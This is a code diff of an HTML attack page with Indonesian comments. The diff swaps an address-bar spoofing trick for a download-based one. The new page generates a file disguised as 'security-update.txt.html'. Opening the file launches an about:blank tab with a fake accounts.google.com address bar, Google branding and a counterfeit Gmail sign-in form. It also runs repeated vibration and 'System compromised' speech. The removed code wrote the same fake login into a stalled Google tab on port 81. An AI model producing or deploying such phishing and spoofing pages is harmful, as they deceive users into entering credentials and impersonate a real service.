@@ -3,141 +3,139 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>Port Delay Address Spoofing</title>
+<title>MIME Sniffing + about:blank Injection</title>
 <style>
 * { box-sizing: border-box; margin: 0; padding: 0; }
-body { font-family: 'Segoe UI', Arial, sans-serif; background: #0a0a0a; color: #fff; padding: 20px; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
-.panel { background: #1e1e1e; padding: 40px; border-radius: 12px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); max-width: 500px; text-align: center; border: 1px solid #333; }
-h1 { font-size: 28px; color: #ff4444; margin-bottom: 15px; text-shadow: 0 0 10px #ff4444; }
-p { font-size: 15px; color: #aaa; margin-bottom: 25px; line-height: 1.6; }
-button { width: 100%; padding: 18px; cursor: pointer; border: none; border-radius: 8px; background: #d32f2f; color: #fff; font-weight: bold; font-size: 18px; box-shadow: 0 4px 15px rgba(211, 47, 47, 0.4); transition: background 0.2s; }
+body { font-family: Arial, sans-serif; background: #f4f6f8; color: #222; padding: 20px; }
+.panel { background: #ffffff; padding: 24px; border-radius: 12px; box-shadow: 0 2px 12px rgba(0, 0, 0, 0.1); max-width: 600px; margin: 40px auto; }
+:fullscreen { background: #111111 !important; color: #00ff00 !important; padding: 20px !important; overflow-y: auto !important; width: 100vw !important; height: 100vh !important; }
+:-webkit-full-screen { background: #111111 !important; color: #00ff00 !important; padding: 20px !important; overflow-y: auto !important; }
+h2 { margin-bottom: 10px; }
+p { margin-bottom: 15px; line-height: 1.5; }
+button { width: 100%; padding: 16px; cursor: pointer; border: none; border-radius: 6px; background: #d32f2f; color: #ffffff; font-weight: bold; font-size: 16px; box-shadow: 0 4px 12px rgba(211, 47, 47, 0.3); transition: background 0.2s; }
 button:hover { background: #b71c1c; }
-button:disabled { background: #555; cursor: not-allowed; }
-#status { margin-top: 20px; font-weight: bold; color: #ff9800; font-size: 14px; font-family: monospace; }
+#status { margin-top: 16px; font-weight: bold; color: #d32f2f; padding: 12px; background: #ffebee; border-radius: 6px; text-align: center; border: 1px solid #ffcdd2; }
 </style>
 </head>
 
 <body>
 <div class="panel" id="main-panel">
-    <h1>⚠️ PORT DELAY SPOOFING</h1>
-    <p>Memicu Address Bar asli (Google) dengan menahan koneksi menggunakan Port yang salah.</p>
-    
-    <button id="start-btn" type="button">Mulai Spoofing</button>
-    
-    <div id="status" role="status">Menunggu interaksi...</div>
+<h2>MIME Sniffing + about:blank</h2>
+<p>Mengunduh file .txt.html yang saat dibuka akan membuka tab about:blank dan menyuntikkan Fake Login Google.</p>
+
+<button id="start-btn" type="button">Mulai Generate File</button>
+<div id="status" role="status">Sistem siap.</div>
 </div>
 
 <script>
 const startBtn = document.getElementById("start-btn");
 const statusDiv = document.getElementById("status");
 
-let isProcessing = false;
+const prepareMimeBlobAsync = (i) => {
+    return new Promise((resolve) => {
+        queueMicrotask(() => {
+            // Payload HTML yang akan dieksekusi saat file .txt.html dibuka
+            const payloadText = "<!DOCTYPE html>" +
+            "<html>" +
+            "<head><meta charset='UTF-8'><title>Google Security</title></head>" +
+            "<body style='margin:0;padding:0;background:#0f111a;color:#fff;font-family:sans-serif;display:flex;align-items:center;justify-content:center;height:100vh;'>" +
+            "<div style='background:#1e2130;padding:40px;border-radius:12px;box-shadow:0 10px 30px rgba(0,0,0,0.5);max-width:400px;text-align:center;border:1px solid #333;'>" +
+            "    <h2 style='color:#4CAF50;margin-bottom:10px;'>⚙️ Memuat Sistem...</h2>" +
+            "    <p style='color:#aaa;font-size:14px;margin-bottom:25px;line-height:1.5;'>Mengalihkan ke halaman verifikasi keamanan...</p>" +
+            "    <p id='status' style='color:#ff9800;font-size:14px;font-weight:bold;'>Mohon tunggu...</p>" +
+            "</div>" +
+            "<script>" +
+            "(function(){" +
+            "\"use strict\";" +
+            
+            // 1. BUKA TAB ABOUT:BLANK SECARA INSTAN
+            "var w = window.open('about:blank', '_blank');" +
+            
+            "if (w) {" +
+            "    try {" +
+            
+            // 2. SPOOFING TITLE & FAVICON
+            "        w.document.title = 'Google';" +
+            "        var link = w.document.createElement('link');" +
+            "        link.rel = 'icon';" +
+            "        link.href = 'https://www.google.com/favicon.ico';" +
+            "        w.document.head.appendChild(link);" +
 
-function efekHacker() {
-    if (navigator.vibrate) {
-        navigator.vibrate([1000, 200, 1000, 200, 1000]);
-    }
-    if ('speechSynthesis' in window) {
-        window.speechSynthesis.cancel();
-        const utterance = new SpeechSynthesisUtterance('Hacked by Waguri');
-        utterance.lang = 'en-US';
-        utterance.rate = 0.9;
-        window.speechSynthesis.speak(utterance);
-    }
-}
+            // 3. SUNTIKKAN FAKE LOGIN GOOGLE LANGSUNG KE TAB BARU
+            "        w.document.body.style.margin = '0';" +
+            "        w.document.body.style.padding = '0';" +
+            "        w.document.body.style.background = '#fff';" +
+            "        w.document.body.style.fontFamily = 'Arial, sans-serif';" +
+            "        w.document.body.innerHTML = `" +
+            "            <div style='background:#e8eaed; padding:10px 15px; display:flex; align-items:center; border-bottom:1px solid #dadce0;'>" +
+            "                <div style='background:#fff; border-radius:20px; padding:8px 15px; display:flex; align-items:center; width:100%; box-shadow:0 1px 3px rgba(0,0,0,0.1);'>" +
+            "                    <span style='color:#5f6368; margin-right:10px; font-size:16px;'>🔒</span>" +
+            "                    <span style='color:#202124; font-size:14px; font-weight:bold;'>https://accounts.google.com/signin</span>" +
+            "                </div>" +
+            "            </div>" +
+            "            <div style='display:flex; align-items:center; justify-content:center; height:calc(100vh - 60px); text-align:center; background:#fff;'>" +
+            "                <div style='width:100%; max-width:400px; padding:20px;'>" +
+            "                    <img src='https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png' style='width:200px; margin-bottom:20px;'>" +
+            "                    <h2 style='font-size:20px; font-weight:normal; margin-bottom:20px; color:#202124;'>Sign in</h2>" +
+            "                    <p style='font-size:14px; color:#5f6368; margin-bottom:30px;'>to continue to Gmail</p>" +
+            "                    <input type='email' placeholder='Email or phone' style='width:100%; padding:13px 15px; margin-bottom:15px; border:1px solid #dadce0; border-radius:4px; font-size:16px; box-sizing:border-box; outline:none;'>" +
+            "                    <input type='password' placeholder='Password' style='width:100%; padding:13px 15px; margin-bottom:15px; border:1px solid #dadce0; border-radius:4px; font-size:16px; box-sizing:border-box; outline:none;'>" +
+            "                    <button style='width:100%; padding:12px; background:#1a73e8; color:#fff; border:none; border-radius:4px; font-size:16px; font-weight:bold; cursor:pointer;'>Next</button>" +
+            "                    <p style='color:#f00; font-size:10px; margin-top:20px;'>about:blank Spoofed by Waguri</p>" +
+            "                </div>" +
+            "            </div>" +
+            "        `;" +
 
-startBtn.addEventListener("click", function() {
-    if (isProcessing) return;
-    isProcessing = true;
+            // 4. EFEK GETAR & SUARA DI TAB BARU
+            "        w.eval(`" +
+            "            if (navigator.vibrate) { setInterval(function() { navigator.vibrate([500, 200, 500]); }, 2000); }" +
+            "            if ('speechSynthesis' in window) { setInterval(function() { var msg = new SpeechSynthesisUtterance('System compromised'); msg.lang = 'en-US'; window.speechSynthesis.speak(msg); }, 3000); }" +
+            "        `);" +
+
+            "    } catch(e) {}" +
+            "}" +
+
+            // Update status di halaman utama
+            "document.getElementById('status').textContent = 'Tautan dibuka di tab baru.';" +
+            "document.getElementById('status').style.color = '#4CAF50';" +
+
+            "})();" +
+            "<\/script>" +
+            "</body>" +
+            "</html>";
+          
+            const blob = new Blob([payloadText], { type: "text/html" });
+            const url = URL.createObjectURL(blob);
+            resolve({ id: i, url: url });
+        });
+    });
+};
+
+const triggerInstantDownload = (fileData) => {
+    const link = document.createElement("a");
+    link.href = fileData.url;
+    link.download = `security-update-${fileData.id}.txt.html`; 
+    link.textContent = `Download security-update.txt.html`;
+    link.style.display = "none";
+    document.body.appendChild(link);
+    link.click();
+    document.body.removeChild(link);
+};
+
+startBtn.addEventListener("click", () => {
     startBtn.disabled = true;
-    startBtn.textContent = "Memproses...";
+    statusDiv.textContent = "Menyiapkan file...";
 
-    efekHacker();
-
-    statusDiv.textContent = "Membuka URL Google (Port Delay)...";
-
-    // TRIK PORT DELAY:
-    // Kita arahkan ke accounts.google.com tapi di port 81 (yang tidak merespons).
-    // Browser akan mengubah Address Bar, tapi koneksinya menggantung (timeout).
-    const targetUrl = 'https://accounts.google.com:81/signin';
-    
-    const w = window.open(targetUrl, '_blank');
-
-    if (!w) {
-        statusDiv.textContent = "Pop-up diblokir! Izinkan pop-up di browser Anda.";
-        isProcessing = false;
-        startBtn.disabled = false;
-        return;
-    }
-
-    statusDiv.textContent = "Menyuntikkan UI palsu saat koneksi tertahan...";
-
-    // Kita gunakan setInterval untuk menyuntikkan form secepat mungkin
-    let counter = 0;
-    const interval = setInterval(() => {
-        counter++;
+    setTimeout(async () => {
         try {
-            // Suntikkan HTML ke tab saat koneksi masih tertahan
-            if (w.document) {
-                w.document.open();
-                w.document.write(`
-                    <!DOCTYPE html>
-                    <html>
-                    <head>
-                        <title>Google</title>
-                        <link rel="icon" href="https://www.google.com/favicon.ico">
-                        <style>
-                            body { margin:0; padding:0; background:#fff; font-family:Arial, sans-serif; display:flex; align-items:center; justify-content:center; height:100vh; }
-                            .login-box { width:100%; max-width:400px; text-align:center; padding:20px; }
-                            .google-logo { width:200px; margin-bottom:20px; }
-                            h2 { font-size:20px; font-weight:normal; margin-bottom:20px; color:#202124; }
-                            p { font-size:14px; color:#5f6368; margin-bottom:30px; }
-                            input { width:100%; padding:13px 15px; margin-bottom:15px; border:1px solid #dadce0; border-radius:4px; font-size:16px; box-sizing:border-box; outline:none; }
-                            button { width:100%; padding:12px; background:#1a73e8; color:#fff; border:none; border-radius:4px; font-size:16px; font-weight:bold; cursor:pointer; }
-                            .warning { color:#f00; font-size:10px; margin-top:20px; }
-                        </style>
-                    </head>
-                    <body>
-                        <div class="login-box">
-                            <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" class="google-logo">
-                            <h2>Sign in</h2>
-                            <p>to continue to Gmail</p>
-                            <input type="email" placeholder="Email or phone" id="phish-email">
-                            <input type="password" placeholder="Password" id="phish-pass">
-                            <button>Next</button>
-                            <p class="warning">Port Spoofed by Waguri</p>
-                        </div>
-                    </body>
-                    </html>
-                `);
-                w.document.close();
-
-                clearInterval(interval);
-                statusDiv.textContent = "Berhasil! Address Bar menampilkan Google (Port 81).";
-                statusDiv.style.color = '#4CAF50';
-
-                // Tambahkan efek getar di tab baru
-                w.eval(`
-                    if (navigator.vibrate) { setInterval(function() { navigator.vibrate([500, 200, 500]); }, 2000); }
-                `);
-            }
-        } catch (e) {
-            // Jika Chrome memblokir injeksi (karena origin sudah berubah), hentikan.
-            clearInterval(interval);
-            statusDiv.textContent = "Gagal: Browser memblokir injeksi.";
-            statusDiv.style.color = '#f00';
-            isProcessing = false;
-            startBtn.disabled = false;
+            const fileData = await prepareMimeBlobAsync(1);
+            triggerInstantDownload(fileData);
+            statusDiv.textContent = "File berhasil diunduh. Buka file .txt.html.";
+        } catch(e) {
+            statusDiv.textContent = "Gagal: " + e.message;
         }
-
-        // Hentikan jika lebih dari 5 detik
-        if (counter > 500) {
-            clearInterval(interval);
-            statusDiv.textContent = "Waktu habis.";
-            isProcessing = false;
-            startBtn.disabled = false;
-        }
-    }, 10);
+        startBtn.disabled = false;
+    }, 300);
 });
 </script>
 </body>
